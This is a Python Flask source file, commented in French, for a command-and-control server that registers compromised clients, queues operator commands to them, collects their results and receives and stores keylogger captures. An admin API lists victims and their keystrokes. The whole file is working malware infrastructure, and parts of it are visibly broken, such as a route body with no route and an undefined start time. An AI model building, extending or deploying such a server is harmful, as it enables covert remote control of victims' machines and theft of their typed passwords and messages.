from flask import Flask, request, jsonify
import time
import threading
from datetime import datetime
import os
from config import ENCRYPTION_KEY
from encryptor import Encryptor
from protocol import Protocol
from database_sql import DatabaseSQL
from db_config import get_database_url


app = Flask(__name__)

# Initialiser la base de données MySQL
db = DatabaseSQL(get_database_url())

# Note: Les stockages en mémoire sont maintenant gérés par la BD
# Garder un cache en mémoire pour les performances
clients_cache = {}
cache_lock = threading.Lock()

encryptor = Encryptor(ENCRYPTION_KEY)




def cleanup_old_clients():
    """Nettoyer les clients inactifs dans la BD"""
    while True:
        try:
            # Nettoyer les clients inactifs depuis plus d'1 heure
            deleted_count = db.cleanup_old_clients(max_age_seconds=3600)
            
            # Nettoyer aussi le cache en mémoire
            with cache_lock:
                current_time = time.time()
                clients_to_remove = [
                    cid for cid, data in clients_cache.items()
                    if current_time - data.get('last_seen', 0) > 3600
                ]
                for cid in clients_to_remove:
                    clients_cache.pop(cid, None)
            
            # Nettoyer les anciennes commandes
            db.cleanup_old_commands(max_age_seconds=3600)
            
        except Exception as e:
            print(f"[CLEANUP] Erreur: {e}")
        
        time.sleep(30)  # Vérifier toutes les 30 secondes

def cleanup_old_keylogs():
    """Nettoyer les anciens keylogs"""
    while True:
        try:
            db.cleanup_old_keylogs(max_age_seconds=24 * 3600)  # 24 heures
            time.sleep(3600)  # Toutes les heures
        except Exception as e:
            print(f"[KEYLOG_CLEANUP] Erreur: {e}")
            time.sleep(300)

# Démarrer les threads de nettoyage
cleanup_thread = threading.Thread(target=cleanup_old_clients, daemon=True)
cleanup_thread.start()

keylog_cleanup_thread = threading.Thread(target=cleanup_old_keylogs, daemon=True)
keylog_cleanup_thread.start()


@app.route('/')
def home():
    return "C2 Server Online - " + datetime.now().isoformat()


@app.route('/register', methods=['POST'])
def register_client():
    try:
        encrypted_data = request.json.get('data')
        if not encrypted_data:
            error_msg = Protocol.create_error_message("No encrypted data provided!")

            encrypted_res = encryptor.encrypt(error_msg)
            return jsonify({
                "data": encrypted_res
            }), 400
        


        client_data = encryptor.decrypt(encrypted_data)
        if not client_data:
            error_msg = Protocol.create_error_message("Decryption failed")
            encrypted_res = encryptor.encrypt(error_msg)
            return jsonify({
                "data": encrypted_res
            }), 400
        


        if client_data.get("type") != Protocol.MSG_REGISTER:
            error_msg = Protocol.create_error_message("Invalid message type for registration")

            encrypted_res = encryptor.encrypt(error_msg)
            return jsonify({
                "data": encrypted_res
            }), 400
        


        client_id = client_data.get("client_id")
        system_info = client_data.get("system_info", {})

        if not client_id:
            error_msg = Protocol.create_error_message("No client id in message")
            encrypted_res = encryptor.encrypt(error_msg)
            
            return jsonify({
                "data": encrypted_res
            }), 400
        

        client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)

        # Enregistrer dans la BD
        success = db.register_client(client_id, system_info, client_ip)
        
        if success:
            # Mettre à jour le cache en mémoire
            with cache_lock:
                clients_cache[client_id] = {
                    'system_info': system_info,
                    'last_seen': time.time(),
                    'ip': client_ip
                }
            
            print(f"[REGISTER] Client {client_id} enregistré avec succès")
        else:
            print(f"[REGISTER] Erreur lors de l'enregistrement de {client_id}")

        response_data = Protocol.create_success_message("Registered successfully!!!")
        encrypted_response = encryptor.encrypt(response_data)

        return jsonify({"data": encrypted_response})
    

    except Exception as e:
        print(f"REGISTRATION ERROR: {e}")
        error_msg = Protocol.create_error_message(str(e))
        error_res = encryptor.encrypt(error_msg)

        return jsonify({
            "data": error_res
        }), 500


@app.route('/heartbeat', methods=['POST'])
def heartbeat():
    try:
        encrypted_data = request.json.get('data')
        if not encrypted_data:
            error_msg = Protocol.create_error_message("No encrypted data")
            encrypted_res = encryptor.encrypt(error_msg)
            return jsonify({
                "data": encrypted_res
            }), 400



        heartbeat_data = encryptor.decrypt(encrypted_data)
        if not heartbeat_data:
            error_msg = Protocol.create_error_message("Decryption failed!")
            encrypted_res = encryptor.encrypt(error_msg)
            return jsonify({
                "data": encrypted_res
            }), 400

        if heartbeat_data.get("type") != Protocol.MSG_HEARTBEAT:
            error_msg = Protocol.create_error_message("Invalid message type for heartbeat")
            encrypted_res = encryptor.encrypt(error_msg)
            return jsonify({
                "data": encrypted_res
            }), 400



        client_id = heartbeat_data.get('client_id')

        if client_id:
            # Mettre à jour dans la BD
            success = db.update_client_heartbeat(client_id)
            
            if success:
                # Mettre à jour le cache
                with cache_lock:
                    if client_id in clients_cache:
                        clients_cache[client_id]['last_seen'] = time.time()
                
                res_msg = Protocol.create_success_message()
                encrypted_response = encryptor.encrypt(res_msg)
                return jsonify({
                    "data": encrypted_response
                })
            else:
                error_msg = Protocol.create_error_message("Client not found!")
                encrypted_response = encryptor.encrypt(error_msg)
                return jsonify({
                    "data": encrypted_response,
                }), 404
        else:
            error_msg = Protocol.create_error_message("No client_id provided!")
            encrypted_response = encryptor.encrypt(error_msg)
            return jsonify({
                "data": encrypted_response,
            }), 400
    
    except Exception as e:
        error_msg = Protocol.create_error_message(str(e))
        encrypted_res = encryptor.encrypt(error_msg)

    """Récupérer la liste de tous les clients depuis la BD"""
    try:
        clients_list = db.get_all_clients()
        
        print(f"[ADMIN] Returning {len(clients_list)} clients from database")
        return jsonify({
            "status": "success",
            "clients": clients_list,
            "total_clients": len(clients_list),
            "server_time": datetime.now().isoformat()
        })
    except Exception as e:
        print(f"[ADMIN] Erreur lors de la récupération des clients: {e}")
        return jsonify({
            "status": "error",
            "error": str(e),
            "clients": [],
            "total_clients": 0
        }), 500
    print(f"[ADMIN] Returning {len(clients_list)} clients")
    return jsonify({
        "status": "success",
        "clients": clients_list,
        "total_clients": len(clients_list),
        "server_time": datetime.now().isoformat()
    })


@app.route('/admin/status', methods=['GET'])
def server_status():
    """Récupérer le statut du serveur"""
    try:
        all_clients = db.get_all_clients()
        online_clients = sum(1 for client in all_clients if client.get('online', False))
        
        return jsonify({
            "status": "online",
            "total_clients": len(all_clients),
            "online_clients": online_clients,
            "server_time": datetime.now().isoformat(),
            "uptime_seconds": time.time() - app.start_time
        })
    except Exception as e:
        return jsonify({
            "status": "error",
            "error": str(e)
        }), 500


@app.route("/admin/process/<client_id>", methods=['POST'])
def send_process_command(client_id):
    """Envoyer une commande à un client"""
    try:
        command_data = request.json
        action = command_data.get("action")
        data = command_data.get("data", {})
        
        if not action:
            return jsonify({"error": "No action specified"}), 400
        
        command_id = f'cmd_{int(time.time() * 1000)}'
        
        # Ajouter dans la BD
        success = db.add_command(client_id, command_id, action, data)
        
        if success:
            
            print(f"[PROCESS] Commande mise en file pour {client_id}: {action}")
            return jsonify({
                "success": True,
                "command_id": command_id,
                "message": f'Command queued for client {client_id}'
            })
        else:
            return jsonify({"error": "Failed to queue command"}), 500
    
    except Exception as e:
        print(f"[PROCESS] Erreur: {e}")
    
@app.route("/admin/command_result/<command_id>", methods=['GET'])
def get_command_result(command_id):
    """Récupérer le résultat d'une commande"""
    try:
        result_data = db.get_command_result(command_id)
        if result_data:
            return jsonify({"success": True, "result": result_data['result']})
        else:
            return jsonify({"error": "Result not found or expired"}), 404
    
    except Exception as e:
        print(f"[RESULT] Erreur: {e}")
        return jsonify({"error": f'Failed to get result: {e}'}), 500


@app.route("/commands", methods=["POST"])
def get_commands():
    """Récupérer les commandes en attente pour un client"""
    try:
        encrypted_data = request.json.get('data')
        if not encrypted_data:
            return jsonify({"error": "No encrypted data"}), 400
        
        client_data = encryptor.decrypt(encrypted_data)
        if not client_data or client_data.get("type") != Protocol.MSG_GET_COMMANDS:
            return jsonify({"error": "Invalid request"}), 400
        
        client_id = client_data.get("client_id")
        if not client_id:
            return jsonify({"error": "No client ID"}), 400
        
        print(f"[SERVER] Client {client_id} requesting commands")
        
        # Récupérer les commandes depuis la BD
        commands = db.get_pending_commands(client_id)
        print(f"[SERVER] Found {len(commands)} pending commands for {client_id}")
        
        if commands:
            print(f"[SERVER] Sending {len(commands)} commands to {client_id}")
        
        response_data = {
            "type": "commands",
            "commands": commands
        }
        
        encrypted_response = encryptor.encrypt(response_data)
        return jsonify({"data": encrypted_response})
    
    except Exception as e:
        print(f"[SERVER] Error in /commands: {e}")
        return jsonify({"error": f"Failed to get commands: {e}"}), 500


@app.route("/commands_result", methods=["POST"])
def submit_command_result():
    try:
        print(f"[SERVER] Received command result request")
        encrypted_data = request.json.get("data")
        if not encrypted_data:
            print(f"[SERVER] Error: No encrypted data in command result")
            return jsonify({"error": "No encrypted data"}), 400
        
        print(f"[SERVER] Decrypting command result...")
        client_data = encryptor.decrypt(encrypted_data)
        if not client_data:
            print(f"[SERVER] Error: Failed to decrypt command result")
            return jsonify({"error": "Decryption failed"}), 400
            
        print(f"[SERVER] Decrypted data type: {type(client_data)}")

        if not isinstance(client_data, dict) or client_data.get("type") != "command_result":
            print(f"[SERVER] Error: Invalid message format or type: {type(client_data)}")
            return jsonify({"error": "Invalid request format"}), 400
        
        command_id = client_data.get("command_id")
        result = client_data.get("result")
        
        client_id = client_data.get('client_id')
        
        print(f"[SERVER] Command ID: {command_id}, Result type: {type(result)}")
        
        if command_id and result is not None:
            # Stocker dans la BD
            success = db.add_command_result(command_id, client_id, result)
            
            if success:
                print(f"[SERVER] Successfully stored result for command {command_id} in database")
                return jsonify({"success": True})
            else:
                print(f"[SERVER] Failed to store result in database")
                return jsonify({"error": "Failed to store result"}), 500
            print(f"[SERVER] Error: Missing command_id or result")
            return jsonify({"error": "Missing command_id or result"}), 400
    
    except Exception as e:
        print(f"[SERVER] Error in /commands_result: {e}")
        import traceback
        print(f"[SERVER] Traceback: {traceback.format_exc()}")
        return jsonify({"error": f"Failed to submit result: {e}"}), 500


@app.route("/keylog_data", methods=["POST"])
def receive_keylog_data():
    """Recevoir et stocker les keylogs d'un client"""
    try:
        print(f"[KEYLOG] Received keylog data request")
        encrypted_data = request.json.get("data")
        if not encrypted_data:
            print(f"[KEYLOG] Error: No encrypted data")
            return jsonify({"error": "No encrypted data"}), 400
        
        print(f"[KEYLOG] Decrypting keylog data...")
        keylog_data = encryptor.decrypt(encrypted_data)
        if not keylog_data:
            print(f"[KEYLOG] Error: Failed to decrypt keylog data")
            return jsonify({"error": "Decryption failed"}), 400
            
        print(f"[KEYLOG] Decrypted data type: {keylog_data.get('type')}")

        # Vérifier que c'est bien des keylogs
        if not isinstance(keylog_data, dict) or keylog_data.get("type") != "keylog_data":
            print(f"[KEYLOG] Error: Invalid message type: {keylog_data.get('type')}")
            return jsonify({"error": "Invalid keylog data format"}), 400
        
        client_id = keylog_data.get("client_id")
        logs = keylog_data.get("logs", [])
        log_count = keylog_data.get("log_count", 0)
        
        print(f"[KEYLOG] Client: {client_id}, Logs count: {log_count}")
        
        if client_id and logs:
            # Stocker dans la BD
            success = db.add_keylogs(client_id, logs)
            
            if success:
                # Mettre à jour le heartbeat
                db.update_client_heartbeat(client_id)
                
                print(f"[KEYLOG] ✅ Successfully stored {len(logs)} keylogs for client {client_id} in database")
                
                return jsonify({
                    "success": True, 
                    "message": f"Received {len(logs)} keylogs"
                })
            else:
                return jsonify({"error": "Failed to store keylogs"}), 500
        else:
            print(f"[KEYLOG] Error: Missing client_id or logs")
            return jsonify({"error": "Missing client_id or logs"}), 400
    
    except Exception as e:
        print(f"[KEYLOG] Error in /keylog_data: {e}")
        import traceback
        print(f"[KEYLOG] Traceback: {traceback.format_exc()}")
        return jsonify({"error": f"Failed to process keylogs: {e}"}), 500


@app.route("/admin/keylogs/<client_id>", methods=["GET"])
def get_client_keylogs(client_id):
    """Récupérer les keylogs d'un client"""
    try:
        limit = request.args.get('limit', 100, type=int)
        
        # Récupérer depuis la BD
        logs = db.get_keylogs(client_id, limit)
        
        return jsonify({
            "success": True,
            "client_id": client_id,
            "keylogs": logs,
            "returned_logs": len(logs)
        })
    
    except Exception as e:
        print(f"[ADMIN_KEYLOG] Error getting keylogs for {client_id}: {e}")
        return jsonify({"error": f"Failed to get keylogs: {e}"}), 500


@app.route("/admin/keylogs_stats", methods=["GET"])
def get_keylogs_stats():
    """Récupérer les statistiques des keylogs"""
    try:
        stats_data = db.get_keylog_stats()
        
        return jsonify({
            "success": True,
            **stats_data
        })
    
    except Exception as e:
        print(f"[KEYLOG_STATS] Erreur: {e}")
        return jsonify({"error": f"Failed to get keylog stats: {e}"}), 500


# Point d'entrée principal
if __name__ == "__main__":
    print("="*60)
    print("🚀 SERVEUR C2 - DÉMARRAGE")
    print("="*60)
    print(f"Base de données: MySQL (c2_database)")
    print(f"Serveur: http://0.0.0.0:5000")
    print(f"Interface admin: http://localhost:5000/admin/clients")
    print("="*60)
    
    # Démarrer les threads de nettoyage
    cleanup_thread = threading.Thread(target=cleanup_old_clients, daemon=True)
    cleanup_thread.start()
    
    keylog_cleanup_thread = threading.Thread(target=cleanup_old_keylogs, daemon=True)
    keylog_cleanup_thread.start()
    
    # Démarrer le serveur Flask
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)